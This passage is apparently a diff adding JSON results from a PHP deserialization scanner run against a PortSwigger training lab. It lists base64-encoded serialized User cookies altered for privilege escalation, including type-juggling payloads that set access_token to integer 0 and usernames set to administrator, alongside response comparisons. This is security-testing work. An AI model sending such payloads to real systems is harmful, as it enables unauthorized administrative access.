+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2813,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2812,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2817,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": "access_token->i:0",
+          "indicators": [
+            "Observation: response length changed by +69 bytes (baseline=3888 mutated=3957, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3957,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "payload_type": "type_juggle"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3888,
+            "status": 200
+          },
+          "chain": "username=administrator + access_token=i:0",
+          "indicators": [
+            "Observation: response length changed by +76 bytes (baseline=3888 mutated=3964, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labsEcommerce.css rel=stylesh')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/explo",
+            "length": 3964,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "payload_type": "type_juggle_privesc"
+        }
+      ],
+      "confidence": "High",
+      "confirmation_status": "Suspected",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500"
+      ],
+      "likely_vulnerable": true,
+      "location": "cookie",
+      "method": "GET",
+      "mutations_count": 10,
+      "name": "session",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"d9n6c5zwx1kuf8eulrdqn2bzi0dqo80w\";}"
+      ],
+      "notes": "String field detected — try changing role/privilege value",
+      "severity": "Medium",
+      "severity_note": null,
+      "subtype": null,
+      "suggested_probe": "modify_string",
+      "type": "PHP",
+      "url": "https://0a7b00d30427702480d15db7009f0032.web-security-academy.net/product?productId=1"
+    },
+    {
+      "attempts": [
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2847,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2563,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImQ5bjZjNXp3eDFrdWY4ZXVscmRxbjJiemkwZHFvODB3Ijt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2562,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiZDluNmM1end4MWt1ZjhldWxyZHFuMmJ6aTBkcW84MHciO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2567,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJkOW42YzV6d3gxa3VmOGV1bHJkcW4yYnppMGRxbzgwdyI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2821,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2813,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2812,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": null,
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class=link",
+            "length": 2817,
+            "status": 500
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "payload_type": "modify_string"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "access_token->i:0",
+          "indicators": [
+            "Observation: response length changed by +69 bytes (baseline=3312 mutated=3381, same status 200) — possible behavioral change, verify manually",
+            "Response content differs in a small, localized way despite same status (similarity=0.99) (baseline='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ' mutated='<!DOCTYPE html>\\n<html>\\n<!--LAB_HEAD_START-->\\n    <head>\\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\\n        <link href=/resources/css/labs.css rel=stylesheet>\\n    ')"
+          ],
+          "likely_vulnerable": true,
+          "mutated": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3381,
+            "status": 200
+          },
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "payload_type": "type_juggle"
+        },
+        {
+          "baseline": {
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Modifying serialized data types</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Modifying serialized data types</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab",
+            "length": 3312,
+            "status": 200
+          },
+          "chain": "username=administrator + access_token=i:0",
+          "indicators": [
+            "Observation: response length changed by -73 bytes (baseline=3312 mutated=3239, same status 200) — possible behavioral change, verify manually",
